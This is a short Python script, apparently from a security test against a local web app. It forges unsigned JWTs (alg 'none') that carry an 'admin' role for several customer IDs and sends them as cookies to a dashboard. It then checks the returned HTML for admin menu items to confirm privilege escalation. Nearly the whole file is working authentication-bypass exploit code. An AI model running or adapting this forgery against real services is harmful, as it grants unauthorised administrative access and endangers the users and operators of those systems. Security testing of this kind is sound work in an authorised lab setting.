#!/usr/bin/env python3
"""Test JWT with a real user from the database"""

import json
import base64
import time
import urllib.request

def b64url_encode(data):
    json_str = json.dumps(data)
    return base64.urlsafe_b64encode(json_str.encode()).rstrip(b'=').decode()

def forge_jwt(customer_id, role="admin"):
    header = {"typ": "JWT", "alg": "none"}
    payload = {
        "sub": customer_id,
        "role": role,
        "iat": int(time.time()),
        "exp": int(time.time()) + 3600
    }
    h = b64url_encode(header)
    p = b64url_encode(payload)
    return f"{h}.{p}."

def test_dashboard(customer_id, token):
    """Test /dashboard page with the token"""
    url = "http://localhost:9443/dashboard"
    
    try:
        req = urllib.request.Request(url)
        req.add_header('Cookie', f'access_token={token}')
        
        with urllib.request.urlopen(req) as response:
            html = response.read().decode('utf-8')
            
            # Check for admin menu
            has_admin = 'admin-dashboard' in html or 'admin-vault' in html or 'admin-audit' in html
            has_admin_main = '"admin"' in html or "'admin'" in html
            
            print(f"Testing with customer_id: {customer_id}")
            print(f"  Has admin submenu items: {'YES' if has_admin else 'NO'}")
            print(f"  Has admin references: {'YES' if has_admin_main else 'NO'}")
            
            # Extract user display info if present
            if f'<span class="hidden sm:block">' in html:
                start = html.find('<span class="hidden sm:block">')
                end = html.find('</span>', start)
                user_name = html[start+30:end]
                print(f"  Logged in as: {user_name}")
            
            return has_admin
            
    except Exception as e:
        print(f"ERROR: {e}")
        return False

# Test with real user from database
print("[*] Testing JWT with real database user (ADMIN001)")
print("=" * 60)
print()

token = forge_jwt("ADMIN001", "admin")
print(f"Token: {token[:50]}...")
test_dashboard("ADMIN001", token)

print()
print("[*] Testing JWT with non-existent user (BS100001)")
print("=" * 60)
print()

token = forge_jwt("BS100001", "admin")
print(f"Token: {token[:50]}...")
test_dashboard("BS100001", token)

print()
print("[*] Testing JWT with another real user (BS100234)")
print("=" * 60)
print()

token = forge_jwt("BS100234", "admin")
print(f"Token: {token[:50]}...")
test_dashboard("BS100234", token)
